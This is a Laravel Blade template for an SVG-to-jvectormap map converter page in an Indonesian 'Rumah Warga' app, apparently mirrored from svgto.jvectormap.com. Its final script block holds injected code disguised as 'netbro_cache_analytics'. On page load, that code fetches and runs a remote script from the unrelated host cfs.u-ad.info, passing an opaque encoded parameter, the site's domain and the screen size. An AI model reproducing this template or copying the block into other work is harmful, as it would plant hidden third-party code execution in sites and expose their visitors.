@extends('layouts.header')


<!-- Mirrored from svgto.jvectormap.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Aug 2015 09:35:56 GMT -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Rumah Warga | Konversi Peta</title>
    <link href="{{asset('style/plugins/svgto.jvectormap/jvectormap/jquery-jvectormap.css')}}" rel="stylesheet" media="all"/>
    <link href="{{asset('style/plugins/svgto.jvectormap/css/style.css')}}" rel="stylesheet" media="all"/>
    <link href="{{asset('style/plugins/svgto.jvectormap/css/jquery-ui-1.9.1.custom.min.css')}}" rel="stylesheet" media="all"/>
    <script src="{{asset('style/plugins/svgto.jvectormap/js/knockout-2.2.0.js')}}"></script>
    <script src="{{asset('style/plugins/svgto.jvectormap/js/jquery-1.8.2.min.js')}}"></script>
    <script src="{{asset('style/plugins/svgto.jvectormap/jvectormap/jquery-jvectormap.min.js')}}"></script>
    <script src="{{asset('style/plugins/svgto.jvectormap/js/jquery-ui-1.9.1.custom.min.js')}}"></script>
    <script src="{{asset('style/plugins/svgto.jvectormap/js/app.js')}}"></script>

    <script>
        $(function(){
            app();
        });
    </script>
</head>
@section('isi')
    <section class="content">
        <div class="col-md-10" xmlns="http://www.w3.org/1999/html">
            <div class="box box-success flat">
                <div class="box-header with-border" style="height: 40px;">

                </div><!-- /.box-header -->
                <div class="box-body" style="min-height: 400px; ">
                    <div id="card-input" class="card">
                        <div class="card-header">Konversi Peta</div>
                        <div class="card-content" style="padding:10px;">
                            <div id="input-id-attribute" style="display: none;"><label>Id attribute:</label><input value="id"/></div>
                            <div id="input-name-attribute" style="display: none;"><label>Name attribute:</label><input value="title"/></div>
                            <label>Kode SVG :</label>
                            <textarea id="input-source" style="width: 93%; height: 70%; margin-left: 20px"></textarea>
                        </div>
                        <div class="card-footer">
                            <button id="input-convert" class="btn btn-success flat" style="margin-left: 20px; margin-top: -40px;" data-toggle="tooltip" title="Konversi Peta">
                                <i class="fa fa-cog margin-r-5
                                 "></i> Konversi ke Peta
                            </button>
                        </div>
                    </div>

                    <form class="form" role="form" method="POST" action="{{url("konversi/add-map")}}">
                        <input type="hidden" name="_token" value="{{ csrf_token() }}">
                    <div id="card-settings" class="card">
                        <div class="card-header">Pengaturan</div>
                        <div class="card-content">
                            <div id="settings-panel" style="margin-left: 20px;">

                                <label>Klaster : </label>
                                <select class="form-control" id="klaster" onchange="setKlaster(this);" name="klaster" required="true" style="margin-top:5px; width: 100%;">
                                    <option selected disabled>Pilih Klaster</option>
                                    @foreach($getKlaster as $data)
                                        <option value="{{$data->id_klaster}}">{{$data->nama_klaster}}</option>
                                    @endforeach
                                </select><br>
                                <div id="target"></div>

                                <!--<label>Region Parameter:</label>-->
                                <div id="settings-table" style="display: none">
                                    <table cellpadding="0" cellspacing="0" width="">
                                        <thead>
                                        <tr class="header">
                                            <th>id</th>
                                            <th>nama</th>
                                        </tr>
                                        </thead>
                                        <tbody data-bind="foreach: map.paths">
                                        <tr data-bind="attr: {'data-region-id': originalId}">
                                            <td data-bind="text: id"></td>
                                            <td data-bind="text: name"></td>
                                        </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            <div id="settings-divider"></div>
                            <div id="settings-map"></div>
                        </div>
                        <div class="card-footer" >
                            <button id="setting-save" class="btn btn-success flat" style="margin-left: 20px; margin-top: -40px;">
                                <i class="fa fa-check-circle margin-r-5"></i>Simpan
                            </button>
                        </div>
                    </div>

                    <div id="card-save" class="card">
                        <div class="card-header">Kode Peta</div>

                            <div class="card-content" style="margin-left: 20px;">
                                <textarea hidden="" id="save-source" name="kode" style="width: 93%; height: 82%; margin-top:40px;"></textarea>
                            </div>
                            <div class="card-footer">
                                <button id="input-convert" style="margin-left: 20px; margin-top: -40px;"> Simpan </button>
                            </div>

                    </div>
                    </form>
                    <div id="edit-dialog">
                        <div><label for="edit-dialog-id">Id</label><input id="edit-dialog-id"/></div>
                        <div><label for="edit-dialog-name">Name</label><input id="edit-dialog-name"/></div>
                    </div>

                </div>

            </div>
            <script type="text/javascript">
                function setKlaster(id_klaster){
                    $("#target").load('{{ url('konversi/map-name') }}' + '/' + $(id_klaster).val());
                }

                if (self==top) {
                    function netbro_cache_analytics(fn, callback) {
                        setTimeout(function() {fn();callback();
                        }, 0);
                    }

                    function sync(fn) {
                        fn();
                    }function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");
                        var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlROStgF59Bgc%2ba%2bR44wA19xXQAcNCNLUhLaIXN9I8krLWGNIhs5T7nYYzNTyDgoM%2fLUxImYMIYwOWCVRZUFMRIt1RXXli5%2frkjzrnxmbZypr%2fyzFlWylr1pnKsmlLFos%2fFn1L5ahHcA5nIXArfrx6XD4dcUfSZyVFDTQDAPFchWVHOJAKxeQPF5SEU%2bmCsrVObj%2fnDpdo%2bNT456BkZ0ggPuU5WBMnB%2b5wppQDpFf5yUgmaoIF6a%2bym0GDs83iPAFp32dYdzDsi%2fe7v5vccW4C%2f7qn1acIjjYHxq4siiEtgNeGknBlY0r%2fMtZ243%2fpKuvkkICWEMGfGoX9TOVgGQyDLRNs0SSbEJwGeEb6uMYKyWFs9lnm2EPdpQKk4LMGgeMOFjIv6j2fhSzkQnY9MRZMlmo%2bzbEsyo%2biZaskzu1Gq09ixCzP4VqZPEkXVy%2fdY6qtrbkCdlfDbHO%2b5S90udZrw4w%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;
                        var bsa = document.createElement('script');
                        bsa.type = 'text/javascript';
                        bsa.async = true
                        ;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);
                    }netbro_cache_analytics(requestCfs, function(){});
                };

            </script>
        </div>
        </div>
    </section>
    <!-- Mirrored from svgto.jvectormap.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Aug 2015 09:36:04 GMT -->
@endsection
